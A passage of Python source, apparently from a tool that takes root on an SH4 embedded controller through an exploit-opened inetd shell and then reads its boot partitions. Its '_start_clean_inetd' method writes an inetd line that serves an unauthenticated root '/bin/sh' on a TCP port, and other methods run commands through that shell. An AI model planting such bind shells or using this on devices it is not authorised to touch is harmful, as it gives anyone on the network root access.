            ui_before=ui_before or set(), allow_ui_remaining=True)
        self._required(shell.run("rm -f /var/run/stopanacapa && "
                                 "test ! -e /var/run/stopanacapa"),
                       "stop flag abort cleanup")
        self._handoff_event("stop-marker-cleared", phase="abort")
        self.close_clean_listener()

    def _abort_handoff(self, shell: RootShellClient, old_pid: int,
                       clean_pid: int, reason: str,
                       ui_before: set[int] | None = None) -> None:
        """Fail closed, then wait for the UI after releasing both port holders."""
        self.preserve_clean_listener = True
        try:
            self._abort_temporary_listeners(shell, old_pid, clean_pid,
                                            ui_before)
        except AccessError as error:
            raise UiRecoveryError(
                f"{reason}; temporary listener abort needs manual recovery: {error}",
                recovery_required=True, listener_preserved=True,
            ) from error
        self.preserve_clean_listener = False
        try:
            self._wait_for_ui(UI_ABORT_RECOVERY_SECONDS)
        except AccessError as error:
            raise UiRecoveryError(
                f"{reason}; temporary listeners are closed but the UI is still unavailable: {error}",
                recovery_required=True,
            ) from error
        raise UiRecoveryError(
            f"{reason}; temporary listeners were closed and the stock UI recovered",
            recovery_required=False,
        )

    def _temporary_ports_closed(self, seconds: float = 8) -> bool:
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            open_ports = []
            for port in (self.root_port, self.clean_port):
                try:
                    with socket.create_connection((self.target_ip, port), 0.5):
                        open_ports.append(port)
                except OSError:
                    pass
            if not open_ports:
                return True
            time.sleep(0.2)
        return False

    def _abort_before_clean_verified(self, first: RootShellClient, reason: str) -> None:
        """Use the old verified root port to close exact temporary inetds."""
        try:
            probe = self._required(first.run("id; uname -m", timeout=10,
                                             connect_timeout=3), "old root abort probe")
            if "uid=0(root)" not in probe.output or "sh4" not in probe.output:
                raise AccessError("old root port did not prove SH4 root for abort")
        except AccessError as error:
            raise UiRecoveryError(
                f"{reason}; no verified root channel remains to close the exploit listener: {error}",
                recovery_required=True,
            ) from error
        self.shell = first
        self.preserve_clean_listener = True
        try:
            processes = self._inetd_processes(first)
            old_argv = (("/usr/sbin/inetd", OLD_INETD_CONFIG),
                        ("inetd", OLD_INETD_CONFIG))
            clean_argv = (("/usr/sbin/inetd", CLEAN_INETD_CONFIG),
                          ("inetd", CLEAN_INETD_CONFIG))
            old = [pid for pid, args in processes.items() if args in old_argv]
            clean = [pid for pid, args in processes.items() if args in clean_argv]
            if len(old) != 1 or len(clean) > 1:
                raise AccessError("temporary inetd identities are ambiguous before abort")
            self._required(first.run("rm -f /var/run/stopanacapa && "
                                     "test ! -e /var/run/stopanacapa"),
                           "stop flag abort cleanup")
            pids = " ".join(str(pid) for pid in old + clean)
            self._required(first.run(
                f"(sleep 1; kill -TERM {pids}) </dev/null >/dev/null 2>&1 &",
                timeout=10), "temporary inetd shutdown schedule")
            if not self._temporary_ports_closed():
                raise AccessError("temporary root ports remained open after abort")
        except AccessError as error:
            raise UiRecoveryError(
                f"{reason}; exact temporary listener abort could not be verified: {error}",
                recovery_required=True, listener_preserved=True,
            ) from error
        self.shell = None
        self.preserve_clean_listener = False
        try:
            self._wait_for_ui(UI_ABORT_RECOVERY_SECONDS)
        except AccessError as error:
            raise UiRecoveryError(
                f"{reason}; temporary listeners are closed but the UI is still unavailable: {error}",
                recovery_required=True,
            ) from error
        raise UiRecoveryError(
            f"{reason}; temporary listeners were closed and the stock UI recovered",
            recovery_required=False,
        )

    def _start_clean_inetd(self, first: RootShellClient) -> None:
        config = (f'echo "{self.clean_port} stream tcp nowait root /bin/sh sh -i" '
                  f'>{CLEAN_INETD_CONFIG}')
        # This is one root shell command: a separate RootShellClient.run would
        # inspect a different accepted shell. BusyBox ash may briefly expose
        # its glob directory as FD 3, so test each FD link after expansion.
        # Reject a persistent descriptor beyond socket stdio before starting
        # the stock inetd that succeeded on the physical 4.3.2 controller.
        fd_check = ('fd_ok=1; for fd in /proc/$$/fd/*; do '
                    'test -L "$fd" || continue; '
                    'case "${fd##*/}" in 0|1|2) ;; *) fd_ok=0 ;; esac; '
                    'done; /bin/ls -l /proc/$$/fd && test "$fd_ok" -eq 1')
        launch = (config + f' && {{ {fd_check}; }} && '
                  f'/usr/sbin/inetd {CLEAN_INETD_CONFIG}')
        try:
            result = first.run(launch, timeout=45)
        except ShellTransportError as error:
            self._save_clean_launch_transcript(error.partial_output)
            raise
        self._save_clean_launch_transcript(result.output)
        self._required(result, "clean inetd start and shell descriptor gate")

    def _save_clean_launch_transcript(self, output: str) -> None:
        """Keep the shell's FD listing and startup status private for diagnosis."""
        try:
            descriptor = os.open(self.run_dir / "clean-launch-shell.txt",
                                 os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as report:
                report.write(output)
        except OSError:
            # The shell result and postlaunch inode proof remain authoritative.
            pass

    def establish_clean_listener(self) -> RootShellClient:
        """Move root to 22348, terminate only old exploit inetd, restore UI."""
        if self.shell is not None and self.probe_existing_clean_shell():
            self.verify_identity()
            return self.shell
        first = RootShellClient(self.target_ip, self.root_port)
        startup_error: AccessError | None = None
        try:
            self._start_clean_inetd(first)
        except ShellTransportError as error:
            # inetd may have started just before the transient shell closed.
            # Probe the new port instead of sending a duplicate start command.
            startup_error = error
        except AccessError as error:
            self._abort_before_clean_verified(first, str(error))
        clean = RootShellClient(self.target_ip, self.clean_port)
        result = None
        deadline = time.monotonic() + 10
        while time.monotonic() < deadline:
            try:
                candidate = clean.run("id; uname -m", timeout=5, connect_timeout=1)
                result = self._required(candidate, "clean root probe")
                break
            except AccessError:
                time.sleep(0.25)
        if result is None:
            reason = "clean listener did not open after startup"
            if startup_error is not None:
                reason += ": " + str(startup_error)
            self._abort_before_clean_verified(first, reason)
        if "uid=0(root)" not in result.output or "sh4" not in result.output:
            self._abort_before_clean_verified(first, "clean listener did not return SH4 root")
        # Retain the verified listener for abort cleanup if a later UI gate fails.
        self.shell = clean
        valid_programs = ("/usr/sbin/inetd", "inetd")
        clean_argv = {(program, CLEAN_INETD_CONFIG) for program in valid_programs}
        old_argv = {(program, OLD_INETD_CONFIG) for program in valid_programs}
        settle_deadline = time.monotonic() + INETD_SETTLE_SECONDS
        while True:
            try:
                processes = self._inetd_processes(clean)
            except AccessError as error:
                self.preserve_clean_listener = True
                raise UiRecoveryError(
                    f"cannot inventory temporary inetds; preserve the verified root listener: {error}",
                    recovery_required=True, listener_preserved=True,
                ) from error
            clean_pids = [pid for pid, args in processes.items() if args in clean_argv]
            old_pids = [pid for pid, args in processes.items() if args in old_argv]
            if len(clean_pids) == 1 and len(old_pids) == 1:
                break
            # The stock inetd briefly leaves its daemonizing parent visible.
            # Recheck before treating that transient process as ambiguity.
            if time.monotonic() >= settle_deadline:
                break
            time.sleep(0.2)
        if len(clean_pids) != 1 or len(old_pids) != 1:
            self.preserve_clean_listener = True
            raise UiRecoveryError(
                f"expected one clean and one old inetd; found {len(clean_pids)} clean and "
                f"{len(old_pids)} old; preserve the verified root listener for recovery",
                recovery_required=True, listener_preserved=True,
            )
        old_pid, clean_pid = old_pids[0], clean_pids[0]
        ui_before: set[int] = set()
        try:
            observed_ui = self._prove_clean_listener_fds(clean, clean_pid) or set()
            ui_before = self._save_old_listener_before_term(
                clean, old_pid=old_pid, ui_before=observed_ui)
            self._required(clean.run("test ! -e /var/run/stopanacapa"), "stop flag absence")
            self._required(clean.run("touch /var/run/stopanacapa"), "stop flag creation")
            self._required(clean.run(f"kill -TERM {old_pid}"), "old inetd termination")
            self._wait_old_listener_released(
                clean, old_pid=old_pid, clean_pid=clean_pid,
                ui_before=ui_before)
            self._required(clean.run("rm -f /var/run/stopanacapa && "
                                     "test ! -e /var/run/stopanacapa"),
                           "stop flag cleanup")
            self._handoff_event("stop-marker-cleared", phase="normal")
        except AccessError as error:
            self._abort_handoff(clean, old_pid, clean_pid, str(error),
                                ui_before)
        # An init respawn may be delayed after the exploit's port conflict.
        # The clean root listener remains available during this bounded wait.
        try:
            self._wait_for_ui(UI_RECOVERY_SECONDS,
                              quiet_seconds=UI_STARTUP_QUIET_SECONDS,
                              poll_seconds=UI_RECOVERY_POLL_SECONDS)
        except AccessError as error:
            self._abort_handoff(clean, old_pid, clean_pid, str(error),
                                ui_before)
        self.preserve_clean_listener = False
        return clean

    def close_clean_listener(self) -> None:
        """Close only this verified RAM listener on a preflash abort."""
        shell = self.shell or RootShellClient(self.target_ip, self.clean_port)
        processes = self._inetd_processes(shell)
        clean_pids = [
            pid for pid, args in processes.items()
            if args in (("/usr/sbin/inetd", CLEAN_INETD_CONFIG),
                        ("inetd", CLEAN_INETD_CONFIG))
        ]
        if len(clean_pids) != 1:
            raise AccessError("cannot uniquely identify the temporary clean inetd")
        self._required(shell.run(
            f"(sleep 1; kill -TERM {clean_pids[0]}) </dev/null >/dev/null 2>&1 &"
        ), "temporary inetd shutdown schedule")
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            try:
                with socket.create_connection((self.target_ip, self.clean_port), 0.5):
                    pass
            except OSError:
                self.shell = None
                self._handoff_event("clean-listener-closed")
                return
            time.sleep(0.2)
        raise AccessError("temporary root port remained open after inetd shutdown")

    def read_boot_state(self) -> BootState:
        if self.shell is None:
            raise AccessError("clean root shell is not established")
        section = self.shell.read_proc("/proc/sys/kernel/bootsection")
        generation = self.shell.read_proc("/proc/sys/kernel/bootgeneration")
        proc_mtd = self.shell.read_proc("/proc/mtd")
        try:
            section_number = int(section.strip())
            generation_number = int(generation.strip())
        except ValueError as error:
            raise AccessError("invalid boot section or generation") from error
        if section_number not in (0, 1) or generation_number < 0:
            raise AccessError("unexpected boot section or generation")
        return BootState(section_number, generation_number, proc_mtd)
